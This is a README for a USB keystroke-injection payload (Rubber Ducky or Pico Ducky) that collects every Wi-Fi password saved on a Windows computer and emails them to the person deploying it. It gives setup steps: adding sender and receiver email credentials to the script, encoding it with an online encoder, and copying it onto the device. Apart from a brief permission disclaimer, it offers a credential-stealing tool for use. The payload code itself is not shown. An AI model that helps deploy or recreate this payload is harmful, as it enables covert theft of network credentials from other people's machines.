# Rubber Ducky Wifi stealer
 This Script will steal all the wifi passwords on a computer and send them to you via outlook. This script was only tested on WIN10 but it should also work on WIN7 to WIN11.

IMPORTANT: We are not responsible in any way for the use you make of this payload. Make sure to only use this on someone if you have their permission, or use on your own devices!

Before following the How to use tutorials you have to edit the script.txt to include a sender email and a password. You'll also need to add a reciver email. All that is after the "STRING powershell" line and all in caps so you can see it better.

How to use:
Rubber Ducky: Download script.txt and convert it to inject.ini via https://ducktoolkit.com/encode and then put that file onto the micro SD.

Pico Ducky (https://github.com/dbisu/pico-ducky): Download script.txt and change its name to payload.dd and then put that file onto the ready Pico Ducky in setup mode.
